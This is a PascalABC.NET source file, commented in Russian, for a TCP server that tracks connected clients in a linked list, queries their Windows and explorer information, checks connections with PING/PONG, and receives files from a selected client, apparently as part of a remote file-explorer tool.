unit server;

uses 
  System.Net.NetworkInformation,
  System.Threading.Tasks,
  System.Net.Sockets, 
  System.Threading,
  System.Text,
  System.Net, 
  System.IO,
  Newtonsoft.Json,
  types, client,
  ProgressOverlayWindow,
  Notifications;


type
  TcpServer = class 
    
    public AppIsRunning: boolean;
    public listener: TcpListener;
    public ipv4: string;
    public head, tail: TClient;
    public CountOfClients: byte;
    public messageSending: boolean;
    public _accept_service, _pp_service: Thread;
    public port: word;
    public selectedClient: TClient;
    
    /// Представляет конструктор по умолчанию для объекта
    public constructor();
    begin
      self.ipv4 := self.GetIPAddrs();
      self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
      self.listener := new TcpListener(IPAddress.Any, self.port);
      self._accept_service := new Thread(AcceptService);
      self._pp_service := new Thread(PPService);
    end;
    
    
    /// Возобновляет работу сервера и всех его сервисов
    public procedure Resume();
    begin
      self.AppIsRunning := true;
      self.listener.Start();
      self.SetServicesState(ServiceState.Resume);
    end;
    
    /// Останавливает работу сервера и всех его сервисов
    public procedure Start();
    begin
      self.AppIsRunning := true;
      self.listener.Start();
      self.SetServicesState(ServiceState.Run);
    end;
    
    /// Останавливает работу сервера и всех его сервисов
    public procedure Stop();
    begin
      self.SetServicesState(ServiceState.Stop);
      self.listener.Stop();
    end;
    
    function GetIPAddrs(): string;
    begin
      var res: string = '';
      var adapters := NetworkInterface.GetAllNetworkInterfaces();
      
      foreach var adapter in adapters do
      begin
        if not(adapter.OperationalStatus = OperationalStatus.Up)then
          continue;
        
        if LowerCase(adapter.Description).Contains('hyper-v') or 
           LowerCase(adapter.Description).Contains('loopback') then
             continue;
           
        res += adapter.Name;
        
        var ipProps := adapter.GetIPProperties();
        
        foreach var ip in ipProps.UnicastAddresses do
          if ip.Address.AddressFamily = AddressFamily.InterNetwork then
            res += $': {ip.Address.ToString}{#10}';
        
      end;
      Result := res;
    end;
    
    /// Добавляет одного клиента в конец очереди
    public procedure AddClient(clnt: TClient);
    begin
      if self.head = nil then
        (self.head, self.tail) := (clnt, clnt) else 
      begin
        self.tail.next := clnt;
        clnt.prev := self.tail;
        self.tail := clnt;
      end;
      Inc(self.CountOfClients);
    end;
    
    /// Удаляет одного клиента из очереди
    public procedure RemoveClient(clnt: TClient);
    begin
      if self.head = nil then
        exit else 
      if (self.head = self.tail) and (self.head = clnt) then begin
        self.head.client.Close();
        self.tail := nil;
        self.head := nil;
      end else 
      begin
        if clnt = self.tail then begin
          self.tail := self.tail.prev;
          self.tail.next.client.Close();
          self.tail.next := nil;
        end else 
        if clnt = self.head then begin
          self.head := self.head.next;
          self.head.prev.client.Close();
          self.head.prev := nil;
        end else 
        begin
          var res: TClient = self.head.next;
          
          while (res <> clnt) and (res.next <> self.tail) do 
            res := res.next;
          
          if res = clnt then begin
            res.prev.next := res.next;
            res.next.prev := res.prev;
            res.client.Close();
            res := nil;
          end else exit; // Клиент не найден
        end;
      end;
      Dec(self.CountOfClients);
    end;
    
    /// Удаляет одного клиента из очереди по его IP адресу
    public procedure RemoveClient(ip: string);
    begin
      var fnd := self.Find(ip);
      if fnd <> nil then
        self.RemoveClient(fnd);
    end;
    
    /// Ищет клиента среди подключённых по IP адресу
    public function Find(ip: string): TClient;
    begin
      var res: TClient = self.head;
      while (res.ip <> ip) and (res <> self.tail) do 
        res := res.next;
      if res.ip = ip then
        Result := res;
    end;
    
    /// Возвращает массив из всех подключённых клиентов
    public function Walk(): array of TClient;
    begin
      var clients: array of TClient;
      if self.CountOfClients > 0 then begin
        SetLength(clients, self.CountOfClients);
        var cnt := 0;
        
        var res: TClient = self.head;
        while (res <> nil) do
        begin
          clients.SetValue(res, cnt);
          res := res.next;
          Inc(cnt);
        end;
      end;
      Result := clients;
    end;
    
    /// Завершает работу всех сервисов
    public procedure KillAllServices();
    begin
      AppIsRunning := false;
      
      // Ждем завершения всех потоков
      foreach var service in [self._accept_service, self._pp_service] do
      begin
        if (service <> nil) and service.IsAlive then begin
          service.Join(200); // Даем 200 млсек на завершение
          try
            if service.IsAlive then service.Abort(); // Принудительное завершение, если не ответил
          except end;
        end;
      end;
      
    end;
    
    /// Устанавливает состояние сервисов
    public procedure SetServicesState(state: ServiceState);
    begin
      foreach var service in [self._accept_service, self._pp_service] do
        if (service <> nil) then 
          case state of
            ServiceState.Run: service.Start();
            ServiceState.Stop: if service.IsAlive then service.Suspend();
            ServiceState.Resume: service.Resume();
          end;
    end;
    
    /// Сервис: Принимает заявки клиентов на подключение
    private procedure AcceptService();
    begin
      while self.AppIsRunning do
      begin
        if self.listener.Pending then begin
          var newTcpClient: TcpClient = self.listener.AcceptTcpClient();
          if newTcpClient <> nil then begin
            var ip := (newTcpClient.Client.RemoteEndPoint as IPEndPoint).Address;
            var newClient := new TClient(ip.ToString(), self.port, newTcpClient);
            newClient.WinInfo := JsonConvert.DeserializeObject&<WindowsInformation>(self.MessageHandler(GET_WIN_INFO, newClient));
            AddClient(newClient);
          end;
        end;
      end; // while
    end;
    
    /// Сервис: Следит за состоянием подключения клиентов, реализован на технологии PING-PONG
    private procedure PPService();
    begin
      while self.AppIsRunning do
      begin
        
        if (CountOfClients > 0) and (self.messageSending = false) then begin
          self.messageSending := true;
          
          var __connected_devices := self.Walk();
          
          {$omp parallel for}
          for id: byte := 0 to __connected_devices.Length - 1 do
          begin
            var data := new byte[4];
            try
              var stream := __connected_devices[id].client.GetStream();
              
              data := Encoding.UTF8.GetBytes('PING');
              stream.Write(data, 0, 4);
              
              stream.Read(data, 0, 4);
              
              if Encoding.UTF8.GetString(data) <> 'PONG' then
                self.RemoveClient(__connected_devices[id]);
              
            except
              self.RemoveClient(__connected_devices[id]);
            end;
          end;
          
          self.messageSending := false;
        end;
        
        Thread.Sleep(6000);
      end; // while
    end;
    
    
    /// Отправка сообщений
    public function MessageHandler(msg: string; clnt: TClient := nil): string;
    begin
      while self.messageSending do 
        Thread.Sleep(10);
      
      self.messageSending := true;
      
      var selectClient := clnt = nil ? self.selectedClient : clnt;
      var stream := selectClient.client.GetStream();
      
      stream.ReadTimeout := 10000;
      stream.WriteTimeout := 10000;
      
      var message: string = msg;
      var buffer: array of byte;
      
      buffer := Encoding.UTF8.GetBytes(message);
      stream.Write(buffer, 0, buffer.Length);
      
      try
        var sizeBuf := new byte[8];
        var readCount := stream.Read(sizeBuf, 0, 8);
        
//        message := Encoding.UTF8.GetString(buffer, 0, readCount);     
//        if message.StartsWith('R@') then
//        begin
//          ErrorHandler(message);
//          self.messageSending := false; 
//          exit(false);
//        end;
           
        var messageLength := System.BitConverter.ToInt64(sizeBuf, 0);
        
        // Начало передачи файла //
        var receivedBytes := 0;
        var readBytes := 0;
        var chunk := new byte[16384];
        
        var ms := new MemoryStream();
        
        while receivedBytes < messageLength do
        begin  
          var toRead := Min(chunk.Length, messageLength - receivedBytes);
          readBytes := stream.Read(chunk, 0, toRead);
          
          if readBytes = 0 then break;
          
          ms.Write(chunk, 0, readBytes);
          receivedBytes += readBytes;
        end;
        
        message := Encoding.UTF8.GetString(ms.ToArray());
      except
        message := 'Произошла ошибка при передаче данных!';
        ErrorHandler(message);
      end;
      
      stream.Flush();
      
      self.messageSending := false;
      Result := message;
    end;
    
    /// Принимает файл fileName и сохраняет его по пути savePath
    public function ReceiveFile(fileName, savePath: string; progWin: ProgressOverlay := nil): boolean;
    begin
      while self.messageSending do 
        Thread.Sleep(10);
      
      self.messageSending := true;
      
//      Println(fileName);
//      Println(savePath);
      
      var stream := self.selectedClient.client.GetStream();
      var FStream: FileStream;
      var message := E_RECEIVE_FILE + fileName;
      var buffer := new byte[4096];
      
      buffer := Encoding.UTF8.GetBytes(message);
      stream.Write(buffer, 0, buffer.Length);
            
      // Получение размера файла //
      var readCount := stream.Read(buffer, 0, buffer.Length);
      message := Encoding.UTF8.GetString(buffer, 0, readCount);
      
      if message.StartsWith('R@') then
      begin
        ErrorHandler(message);
        self.messageSending := false; 
        exit(false);
      end;
         
      var fileSize := System.BitConverter.ToInt64(buffer, 0);
      
      // Начало передачи файла //
      var receivedBytes := 0;
      var readBytes := 0;
      var chunk := new byte[16384];

      try
        FStream := SafeCreateFile(savePath);
      except on e: Exception do
        begin
          self.messageSending := false;
          ErrorHandler('Ошибка создания файла: ' + e.Message); 
          exit(false);
        end;
      end;
      
      while receivedBytes < fileSize do
      begin
        if progWin <> nil then begin
          var percent := Round(receivedBytes / fileSize * 100);
          progWin.Invoke( procedure -> progWin.SetProgress(percent) );
        end;

        var toRead := Min(chunk.Length, fileSize - receivedBytes);
        readBytes := stream.Read(chunk, 0, toRead);
        
        if readBytes = 0 then break;
        
        FStream.Write(chunk, 0, readBytes);
        receivedBytes += readBytes;
      end;
      
      FStream.Close();
      
      var sizeBuf := new byte[8];
      stream.Read(sizeBuf, 0, 8);
      
      var exit_code_size := System.BitConverter.ToInt64(sizeBuf, 0);
          exit_code_size := stream.Read(buffer, 0, exit_code_size);
      
      var ReceiveEndCode := Encoding.UTF8.GetString(buffer, 0, exit_code_size);
      
      if (receivedBytes = fileSize) and (ReceiveEndCode = E_FILE_SUCCESSFULLY_TRANSFERRED) then
        Result := true 
      else
        &File.Delete(savePath);
      
      stream.Flush();
      self.messageSending := false;
    end;
    
    /// Читает до тех пор пока не прочтет указанное количество байт
    function ReadExact(stream: NetworkStream; buffer: array of byte; count: integer): boolean;
    begin
      var offset := 0;
      while offset < count do
      begin
        var read := stream.Read(buffer, offset, count - offset);
        if read = 0 then exit(false);
        offset += read;
      end;
      Result := true;
    end;
    
    /// Создает файл по указанному пути, в котором указаны не существующие папки
    function SafeCreateFile(__path__: string): FileStream;
    begin
      var dir := Path.GetDirectoryName(__path__);
      
      if not Directory.Exists(dir) then
        Directory.CreateDirectory(dir);
      
      Result := &File.Create(__path__); 
    end;
    
    public function UpdateExInfo(): types.ExplorerInformation := JsonConvert.DeserializeObject&<WindowsInformation>(self.MessageHandler(GET_WIN_INFO)).ExInfo;
  
  end;// class

end.